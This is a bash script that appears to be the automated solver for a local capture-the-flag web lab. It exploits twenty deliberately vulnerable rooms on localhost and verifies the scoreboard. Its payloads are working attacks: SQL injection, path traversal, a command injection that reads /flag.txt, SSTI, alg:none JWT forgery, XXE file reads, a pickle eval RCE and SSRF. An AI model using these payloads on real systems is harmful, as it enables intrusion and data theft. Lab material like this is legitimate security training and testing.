#!/usr/bin/env bash
# Automated proof run: exploits every room and confirms the scoreboard.
# Usage: PLATFORM_PORT=8000 ./scripts/demo-solve.sh
set -uo pipefail

HOST=${CTF_HOST:-127.0.0.1}
PORT=${PLATFORM_PORT:-8000}
BASE="http://$HOST"
P="$BASE:$PORT"
JAR="$(mktemp)"
trap 'rm -f "$JAR" "$JAR6"' EXIT
JAR6="$(mktemp)"
PLAYER="ctfbot-$RANDOM"
TOTAL_POINTS=2975
TOTAL_ROOMS=20
FAIL=0

grab() { grep -oE 'FLAG\{[^}]+\}' | head -n1; }

b64url() { base64 -w0 | tr '+/' '-_' | tr -d '='; }

echo "[*] registering $PLAYER at $P"
curl -sf -c "$JAR" -o /dev/null -d "username=$PLAYER&password=hunter2too" "$P/register" || { echo "[!] register failed"; exit 1; }

capture() {
  local label="$1" value="$2"
  if [ -z "$value" ]; then
    echo "[!] $label: no flag captured"
    FAIL=1
  else
    printf '[+] %-18s %s\n' "$label:" "$value"
  fi
}

echo "[*] room 1 busted-login: SQL injection"
F1=$(curl -sf -X POST --data-urlencode "username=' OR 1=1--" --data-urlencode "password=x" "$BASE:8081/login" | grab || true)
capture "busted-login" "$F1"

echo "[*] room 2 nosy-files: path traversal"
F2=$(curl -sf "$BASE:8082/download?name=../../../flag.txt" | grab || true)
capture "nosy-files" "$F2"

echo "[*] room 3 ping-of-doom: command injection"
F3=$(curl -sf -X POST --data-urlencode "host=127.0.0.1; cat /flag.txt" "$BASE:8083/ping" | grab || true)
capture "ping-of-doom" "$F3"

echo "[*] room 4 ssti-greeting: server-side template injection"
F4=$(curl -sf -X POST --data-urlencode 'name={{ secret_flag }}' "$BASE:8084/greet" | grab || true)
capture "ssti-greeting" "$F4"

echo "[*] room 5 token-forger: alg:none JWT forgery"
H5=$(printf '{"alg":"none","typ":"JWT"}' | b64url)
P5=$(printf '{"sub":"guest","role":"admin"}' | b64url)
T5="$H5.$P5."
F5=$(curl -sf -H "Authorization: Bearer $T5" "$BASE:8085/admin" | grab || true)
capture "token-forger" "$F5"

echo "[*] room 6 idor-invoices: insecure direct object reference"
curl -sf -c "$JAR6" -o /dev/null -d "username=guest&password=guest123" "$BASE:8086/login" || true
F6=$(curl -sf -b "$JAR6" "$BASE:8086/invoice/777" | grab || true)
capture "idor-invoices" "$F6"

echo "[*] room 7 open-panels: exposed debug panel"
F7=$(curl -sf "$BASE:8087/debug" | grab || true)
capture "open-panels" "$F7"

echo "[*] room 8 cookie-shapeshifter: base64 cookie forgery"
C8=$(printf '{"username":"guest","role":"admin"}' | base64 -w0)
F8=$(curl -sf -b "profile=$C8" "$BASE:8088/admin-panel" | grab || true)
capture "cookie-shapeshifter" "$F8"

echo "[*] room 9 regex-doom: regex injection"
F9=$(curl -sf -X POST --data-urlencode 'code=.*' "$BASE:8089/unlock" | grab || true)
capture "regex-doom" "$F9"

echo "[*] room 10 mass-assign: blind mass assignment"
curl -sf -X POST -H 'Content-Type: application/json' -d '{"name":"Guest","role":"admin"}' "$BASE:8090/profile?u=guest" -o /dev/null || true
F10=$(curl -sf "$BASE:8090/profile?u=guest" | grab || true)
capture "mass-assign" "$F10"

echo "[*] room 11 xxe-importer: external entity injection"
XML11='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag.txt">]><r>&x;</r>'
F11=$(printf '%s' "$XML11" | curl -sf -X POST -H 'Content-Type: application/xml' --data-binary @- "$BASE:8091/import" | grab || true)
capture "xxe-importer" "$F11"

echo "[*] room 12 pickle-jar: insecure deserialization RCE"
B12=$(python3 - <<'PYEOF'
import base64, pickle

class P:
    def __reduce__(self):
        return (eval, ("open('/flag.txt').read()",))

print(base64.b64encode(pickle.dumps(P())).decode())
PYEOF
)
F12=$(printf '%s' "$B12" | curl -sf -X POST --data-binary @- "$BASE:8092/load" | grab || true)
capture "pickle-jar" "$F12"

echo "[*] room 13 trusted-proxy: X-Forwarded-For spoofing"
F13=$(curl -sf -H 'X-Forwarded-For: 127.0.0.1' "$BASE:8093/internal" | grab || true)
capture "trusted-proxy" "$F13"

echo "[*] room 14 wrong-method: HTTP verb tampering"
F14=$(curl -sf -X PUT "$BASE:8094/admin-console" | grab || true)
capture "wrong-method" "$F14"

echo "[*] room 15 open-closet: directory listing"
F15=$(curl -sf "$BASE:8095/backups/db_dump_2026.sql" | grab || true)
capture "open-closet" "$F15"

echo "[*] room 16 predictable-reset: weak reset tokens"
T16=$(python3 -c "import hashlib,time;print(hashlib.md5(f'admin:{int(time.time())//600}'.encode()).hexdigest())")
F16=$(curl -sf "$BASE:8096/reset?u=admin&token=$T16" | grab || true)
capture "predictable-reset" "$F16"

echo "[*] room 17 double-trouble: HTTP parameter pollution"
F17=$(curl -sf "$BASE:8097/checkout?price=100&discount=10&discount=99999" | grab || true)
capture "double-trouble" "$F17"

echo "[*] room 18 fetch-boy: SSRF"
F18=$(curl -sf "$BASE:8098/fetch?url=http://127.0.0.1:9001/internal-secrets" | grab || true)
capture "fetch-boy" "$F18"

echo "[*] room 19 union-vault: UNION-based SQL injection"
F19=$(curl -sf -G "$BASE:8099/products" --data-urlencode "q=%' UNION SELECT secret,'x' FROM vault--" | grab || true)
capture "union-vault" "$F19"

echo "[*] room 20 brace-yourself: format string injection"
F20=$(curl -sf -G "$BASE:8100/welcome" --data-urlencode 'name={flag}' | grab || true)
capture "brace-yourself" "$F20"

echo "[*] submitting ${TOTAL_ROOMS} flags"
for f in "$F1" "$F2" "$F3" "$F4" "$F5" "$F6" "$F7" "$F8" "$F9" "$F10" \
         "$F11" "$F12" "$F13" "$F14" "$F15" "$F16" "$F17" "$F18" "$F19" "$F20"; do
  [ -n "$f" ] || continue
  RES=$(curl -sf -b "$JAR" -X POST --data-urlencode "flag=$f" "$P/submit") || RES="submit failed"
  echo "    $f -> $RES"
done

BOARD=$(curl -sf "$P/api/scoreboard")
echo "[*] scoreboard: $BOARD"

if echo "$BOARD" | python3 -c '
import json, sys
player = sys.argv[1]
rooms = int(sys.argv[2])
points = int(sys.argv[3])
rows = json.load(sys.stdin)
row = next((r for r in rows if r["username"] == player), None)
sys.exit(0 if row and row["solved"] == rooms and row["score"] == points else 1)
' "$PLAYER" "$TOTAL_ROOMS" "$TOTAL_POINTS"; then
  echo "[PASS] $TOTAL_ROOMS/$TOTAL_ROOMS rooms exploited and scored ($TOTAL_POINTS pts)."
else
  echo "[FAIL] scoreboard did not confirm $TOTAL_ROOMS solves for $PLAYER."
  FAIL=1
fi
exit $FAIL
